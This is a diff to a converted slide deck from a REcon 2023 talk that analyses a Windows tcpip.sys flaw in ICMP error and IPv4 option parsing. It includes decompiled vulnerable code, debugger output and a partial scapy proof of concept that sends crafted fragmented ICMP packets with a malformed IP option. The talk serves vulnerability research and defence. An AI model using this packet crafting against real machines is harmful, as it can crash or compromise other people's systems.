@@ -8,13 +8,17 @@ year: 2023
 source_pdf: "REcon 2023 Slides/Erik Egsgard_The Hunt for Red October - One Ping Too Many .pdf"
 pages: 48
 sha256: "a34b8675df905bad145bf2a85a0c419479d2044f18472508224c15dc3d5729d2"
-text_chars: 17621
-ocr_pages: 12
+text_chars: 17146
+ocr_pages: 11
 has_ocr: true
 redacted_secrets: 0
+ocr_confidence: 86.4
+ocr_unreliable_blocks: 0
+ocr_timeouts: 0
+pages_recovered_from_text_layer: 0
 companion_files: []
 extractor: "pymupdf4llm 1.28.2 + tesseract"
-converted_at: "2026-08-11T23:24:49Z"
+converted_at: "2026-08-12T06:01:40Z"
 ---
 # The Hunt for Red October - One Ping Too Many
 
@@ -22,11 +26,13 @@ converted_at: "2026-08-11T23:24:49Z"
 **Conference:** REcon 2023  
 **Source:** `REcon 2023 Slides/Erik Egsgard_The Hunt for Red October - One Ping Too Many .pdf` (48 pages)
 
+
 ## Slide 1
 
 RECon Montreal June 2023
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 re FIELD EFFECT
@@ -47,10 +53,10 @@ RECon Montreal June 2023
 
 2
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-ca! FIELD EFFECT
 About Me
 = Security Developer
 = Malware detection and defence
@@ -121,10 +127,10 @@ One Piece At A Time
 
 7
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-ca! FIELD EFFECT
 Tips
 = Keep notes
 = Cache limitations
@@ -162,15 +168,14 @@ Can you count the drivers
 
 10
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 84/100 on the text kept, 76/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-ca! FIELD EFFECT
 Windows
 TC |> | |> USER MODE _
 KERNEL MODE
 Stack
-ra B)
 NDIS Driver
 ```
 
@@ -180,10 +185,10 @@ NDIS Driver
 
 11
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 80/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-ca! FIELD EFFECT
 Windows
 Filtering
 Platform
@@ -195,16 +200,12 @@ Firewall
 Ws2_32.4ll (mpssvc) (policyagent)
 C management C management C management C management
 API API API API
-(fwpuclnt.dil) (fwpuclnt.dil) (fwpucint.dil) (fwpucint.dil)
 RPC RPC Interface (Management)
 Application IKE protocol
 — s UM filter engine le»! AuthiP protocol
 RPC Runtime | <= 8 (ikeext)
 = S oS Base Filtering Engine
 (rpcrt4_dll) ge 8 (bfe)
-ors £
-2
-£
 2 IKE and IPsec layers
 & UM RPC layers (v4iv6)
 User Mode
@@ -214,21 +215,17 @@ TCPIIP Stack IOCTL Interface
 Stream Layer Shim Stream/Datagram Data 7 7
 Layer 3” Party Anti-Virus callout -}—>
 | (v4iv6)
-ci Party Parental _
 ALE Inbound/Outbound Control callout 5
 connection management c ALE Layer =z of
 ( igement) < (v4lv6) < 32
-= 5 3 Party IDS callout = }-—») £ §
 Transport Layer Shim 5 ° a =
 TCP / UDP zt
 (TCP / UDP) TPsec Inbound/Outbound 3" Party NAT callout [-—») =
 Framing Transport Layer
-(v4iv6)
 IPsec callout nal
 Network Layer Shim Inbound/Outbound
 IPv4 | IPv6 IP Layer
 (v4iv6)
-__
 KM Filter Engine
 11
 ```
@@ -364,10 +361,10 @@ AH/ESP
 
 15
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-ca! FIELD EFFECT
 Key Structures
 Packet data handled with NET_BUFFER structures
 NET_BUFFER
@@ -375,7 +372,6 @@ NetBufferHeader
 ChecksumBias
 Reserved
 NdisReserved
-|ProtocolReserved
 MiniportReserved
 NdisPoolHandle
 NET_BUFFER_HEADER
@@ -383,10 +379,7 @@ NetBufferData
 Link
 NET_BUFFER_DATA
 Next
-MdlChain
 DataLength
-DataOfiset
-CurrentMd!
 CurrentMdlOfiset
 15
 ```
@@ -397,7 +390,8 @@ CurrentMdlOfiset
 
 16
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 84/100 on the text kept, 64/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 (i! FIELD EFFECT
@@ -405,10 +399,6 @@ MDL 4
 NET BUFFER
 MDL CHAIN
 Total data i}
-size CurrentMdlOffset =| CurrentiMdl
-yy =
-o
-DataLength °
 NULL
 ```
 
@@ -416,7 +406,7 @@ NULL
 
 ## **Key Functions**
 
-```
+\```
 NDIS_EXPORTED_ROUTINE
 PVOID NdisGetDataBuffer(
 [in]           NET_BUFFER *NetBuffer,
@@ -425,7 +415,7 @@ PVOID NdisGetDataBuffer(
 [in]           ULONG      AlignMultiple,
 [in]           ULONG      AlignOffset
 );
-```
+\```
 
 - Returns pointer to packet data
 
@@ -439,18 +429,18 @@ PVOID NdisGetDataBuffer(
 
 ## **Key Functions**
 
-```
+\```
 NDIS_EXPORTED_ROUTINE
 VOID NdisAdvanceNetBufferDataStart(
-```
+\```
 
-```
+\```
 [in]           NET_BUFFER          *NetBuffer,
 [in]           ULONG               DataOffsetDelta,
 [in]           BOOLEAN             FreeMdl,
 [in, optional] NET_BUFFER_FREE_MDL *FreeMdlHandler
 );
-```
+\```
 
 - Adjusts DataOffset
 
@@ -497,16 +487,16 @@ _IPv6 IPSEC ESP Fragmentation_||X||X|X|
 
 - Leads to processing of unvalidated options
 
-```
+\```
 char localStorage[0x20];
-```
+\```
 
-```
+\```
 data = NdisGetDataBuffer( NetBuffer,
 optionLength, // Not validated
 localStorage,
 0, 0 );
-```
+\```
 
 21
 
@@ -550,7 +540,7 @@ Putting it all together
 
 ## **Code of Interest**
 
-```
+\```
 0: kd> x tcpip!*error*
 fffff805`5c7fefe0 tcpip!IppSendErrorListForDiscardReason(void)
 fffff805`5c8204e0 tcpip!WfpReportSysErrorAsNtStatus(void)
@@ -567,9 +557,9 @@ fffff805`5c92ec10 tcpip!IpIpsProviderSendIcmpError(IpIpsProviderSendIcmpError)
 fffff805`5c916ac4 tcpip!WfpReportSysErrorAsWinError(WfpReportSysErrorAsWinError)
 fffff805`5c98b640 tcpip!PolicyKeynameSizeZeroError
 …
-```
+\```
 
-```
+\```
 0: kd> x tcpip!*fragment*
 fffff805`5c801e70 tcpip!Ipv6pFragmentPacketHelper (void)
 fffff805`5c801590 tcpip!Ipv4pFragmentPacketHelper (void)
@@ -585,7 +575,7 @@ fffff805`5c952ee0 tcpip!Ipv6pReceiveFragment(Ipv6pReceiveFragment)
 fffff805`5c952470 tcpip!Ipv6pAuthenticateFragmentHeader (Ipv6pAuthenticateFragmentHeader)
 fffff805`5c9472d8 tcpip!Ipv4pCompactFragmentationHeader (Ipv4pCompactFragmentationHeader)
 …
-```
+\```
 
 25
 
@@ -595,16 +585,14 @@ fffff805`5c9472d8 tcpip!Ipv4pCompactFragmentationHeader (Ipv4pCompactFragmentati
 
 26
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 yc! FIELD EFFECT
 ICMP Error Packets
 ICMP Message
-1
-¢— from IP datagram that triggered the errar—*
 IP header ICMP header IP header 8 bytes of payload
-Pal Ts
 type code checksum
 Unused (0x00000000)
 ¢ ICMP error messages include the complete IP header and
@@ -618,21 +606,21 @@ the first 8 bytes of the payload (typically: UDP, TCP)
 
 **IcmpErrorClassify**
 
-```
+\```
 void ProcessIcmpErrorClassify( NET_BUFFER *NetBuffer)
 {
 // Skip inner IP header to get protocol details
 status = IppInspectSkipNetworkLayerHeaders( NetBuffer, &headerLength);
 if ( 0 <= status ) {
-```
+\```
 
-```
+\```
 NetioAdvanceNetBuffer( NetBuffer, headerLength);
 WfpGetTLInfoForReceiveOnRawEndpoint( netBuffer, &tlInfo);
 NetioRetreatNetBuffer( NetBuffer, headerLength, 0x0 );
-```
+\```
 
-```
+\```
 if ( addr_type== AF_INET ) {
 status = WfpInspectReceiveControlShimV4( NetBuffer, tlInfo);
 }
@@ -641,11 +629,11 @@ status = WfpInspectReceiveControlShimV6( NetBuffer, tlInfo);
 }
 }
 return;
-```
+\```
 
-```
+\```
 }
-```
+\```
 
 27
 
@@ -657,57 +645,57 @@ IcmpErrorClassify
 
 **SkipHeaders**
 
-```
+\```
 uintIpv4pSkipNetworkLayerHeaders( void *NetBuffer)
 {
 char localStorage[0x14];
 if( NetBuffer->DataLength>= 0x14 )
 {
-```
+\```
 
-```
+\```
 ipHeader= NdisGetDataBuffer( NetBuffer, 0x14, localStorage, 0x4 );
 ipHeaderLength= (*ipHeader& 0xf) << 0x2;
-```
+\```
 
-```
+\```
 if( 0x13 < ipHeaderLength&& ipHeaderLength<= NetBuffer->DataLength) {
 if( ipHeaderLength!= 0x14 ) {
-```
+\```
 
-```
+\```
 NetioAdvanceNetBuffer( NetBuffer, 0x14 );
 uVar3 = Ipv4ProcessOptionsHelper( NetBuffer
-```
+\```
 
-```
+\```
 ipHeaderLength-0x14,
-```
+\```
 
-```
+\```
 NULL,
 ... );
-```
+\```
 
-```
+\```
 NetioRetreatNetBuffer( NetBuffer, 0x14 );
-```
+\```
 
-```
+\```
 }
-```
+\```
 
-```
+\```
 }
-```
+\```
 
-```
+\```
 }
-```
+\```
 
-```
+\```
 }
-```
+\```
 
 28
 
@@ -715,7 +703,7 @@ NetioRetreatNetBuffer( NetBuffer, 0x14 );
 
 ## Ipv4ProcessOptionsHelper()
 
-```
+\```
 uintIpv4ProcessOptionsHelper( NET_BUFFER *NetBuffer, uintBufferLength,
 RECEIVE_CONTEXT *ContextData, ...)
 {
@@ -734,7 +722,7 @@ packetData= packetData+ optionLength;
 }
 return 0x0;
 }
-```
+\```
 
 ???
 
@@ -758,7 +746,7 @@ SkipHeaders
 
 ProcessOptions
 
-```
+\```
 uintWfpProcessInTransportStackIndication( void* Arg0, NET_BUFFER *NetBuffer, ...)
 {
 // Lots of stuff happens
@@ -768,7 +756,7 @@ ProcessIcmpErrorClassify( NetBuffer);
 // More stuff happens
 return 0x0;
 }
-```
+\```
 
 30
 
@@ -776,30 +764,30 @@ return 0x0;
 
 ## **Making Sense of the Data**
 
-```
+\```
 ContextData->field_0x110 = uVar1;
 ContextData->field_0x2fc |= 0x8;
-```
+\```
 
-```
+\```
 0: kd> !pool @r13
 Pool page ffff92867ff21a20 region is Nonpaged pool
 ffff92867ff21000 size:  a00 previous size:    0  (Allocated)  Thre
 *ffff92867ff21a10 size:  300 previous size:    0  (Allocated) *AleE
 PooltagAleE: ALE endpoint context, Binary : tcpip.sys
-```
+\```
 
-```
+\```
 0: kd> x tcpip!*aleendpoint*
 fffff801`536333e0 tcpip!WfpAleEndpointCreationHandler(void)
 fffff801`535c42c8 tcpip!WfpAleEndpointTeardownHandler(void)
 fffff801`53610f60 tcpip!WfpAleEndpointDeactivationHandler(void)
-```
+\```
 
-```
+\```
 ContextData->AleEndpoint= aleEndpoint;
 ContextData->Flags |= 0x8;
-```
+\```
 
 31
 
@@ -815,21 +803,21 @@ SkipHeaders
 
 ProcessOptions
 
-```
+\```
 uintWfpProcessInTransportStackIndication( void* AleEndpoint, NET_BUFFER *NetBuffer, ...)
 {
-```
+\```
 
 - `// Lots of stuff happens`
 
-```
+\```
 if( AleEndpoint->Flags & IS_RAW_SOCKET ) {
 ProcessIcmpErrorClassify( NetBuffer);
 }
 // More stuff
 return 0x0;
 }
-```
+\```
 
 32
 
@@ -852,11 +840,11 @@ Not fragmentable
 
 34
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 82/100 on the text kept, 73/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 [| FIELD EFFECT
-$
 Give me a ping Vasili...
 ```
 
@@ -864,7 +852,7 @@ Give me a ping Vasili...
 
 ## Proof of Concept
 
-```
+\```
 importscapy.allas scpy
 def send_f(frags):
 for f in frags:
@@ -876,7 +864,7 @@ IPerror(src="192.168.0.1",
 options=b"\x95\x26" + b"\x00" * 0x26 /
 ICMP(),
 fragsize=32), iface)
-```
+\```
 
 35
 
@@ -884,19 +872,16 @@ fragsize=32), iface)
 
 36
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 76/100 on the text kept, 64/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 [| FIELD EFFECT
-[fe wii_IP_25140
 &
-Recyclepiny
 BH Administrator: Command Prompt
 IPv4 Addre
 sub k
-_———_ =
 A
-Con)
 1:01 PM
 3/8/2023
 36
@@ -912,10 +897,10 @@ Con)
 
 37
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 92/100 on the text kept, 92/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-ca! FIELD EFFECT
 Alternate Call Paths
 MSRC bulletin implied raw sockets were required
 Possible to reach with ICMP over IPSec tunnels
@@ -953,54 +938,54 @@ IcmpErrorClassify
 
 **SkipHeaders**
 
-```
+\```
 uintIpv4pSkipNetworkLayerHeaders( void *NetBuffer)
 {
 char localStorage[0x14];
 if( NetBuffer->DataLength>= 0x14 )
 {
-```
+\```
 
-```
+\```
 ipHeader= NdisGetDataBuffer( NetBuffer, 0x14, localStorage, 0x4 );
 ipHeaderLength= (*ipHeader& 0xf) << 0x2;
-```
+\```
 
-```
+\```
 if( 0x13 < ipHeaderLength&& ipHeaderLength<= NetBuffer->DataLength) {
 if( ipHeaderLength!= 0x14 ) {
-```
+\```
 
-```
+\```
 NetioAdvanceNetBuffer( NetBuffer, 0x14 );
 uVar3 = Ipv4ProcessOptionsHelper( NetBuffer
-```
+\```
 
-```
+\```
 ipHeaderLength-0x14,
 NULL,
 ... );
-```
+\```
 
-```
+\```
 NetioRetreatNetBuffer( NetBuffer, 0x14 );
-```
+\```
 
-```
+\```
 }
-```
+\```
 
-```
+\```
 }
-```
+\```
 
-```
+\```
 }
-```
+\```
 
-```
+\```
 }
-```
+\```
 
 40
 
@@ -1016,7 +1001,7 @@ SkipHeaders
 
 **ProcessOptions**
 
-```
+\```
 uintIpv4ProcessOptionsHelper( NET_BUFFER *NetBuffer, uintBufferLength,
 RECEIVE_CONTEXT *ContextData, ...)
 {
@@ -1032,7 +1017,7 @@ if( optionLength> BufferLength) { return 0xc000021b; }
 if( optionCode== 0x44 && ContextData!= NULL ) {
 Ipv4pProcessTimestampOption( ContextData, (char *)packetData);
 }
-```
+\```
 
 41
 
@@ -1048,7 +1033,7 @@ The IP Timestamps Option records the time (in Universal Time) when each network 
 
 ## Alternate Call Paths (Part 2)
 
-```
+\```
 0: kd> dpstcpip!Ipv4Global+50
 fffff805`5c9ab050  00000000`00000004
 fffff805`5c9ab058  fffff805`5c811f90 tcpip!Ipv4pValidateNetBuffer
@@ -1057,7 +1042,7 @@ fffff805`5c9ab068  fffff805`5c85bb80 tcpip!Ipv4pAddLinkLayerSuffixAddresses
 fffff805`5c9ab070  fffff805`5c821580 tcpip!Ipv4pUnAddressInterface
 fffff805`5c9ab078  fffff805`5c83ab70 tcpip!Ipv4pInitializeSubInterface
 fffff805`5c9ab080  00000000`00000000
-```
+\```
 
 Ipv4pValidateNetBuffer -> Ipv4pProcessOptions -> Ipv4ProcessOptionsHelper _(with Receive Context pointer)_
 
@@ -1124,12 +1109,3 @@ Computers are hard
 # **That's all folks!**
 
 @hexnomad@infosec.exchange
-
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-ae FIELD EFFECT
-»
-That's all' folks! ——
-@hexnomad@infosec.exchange
-```
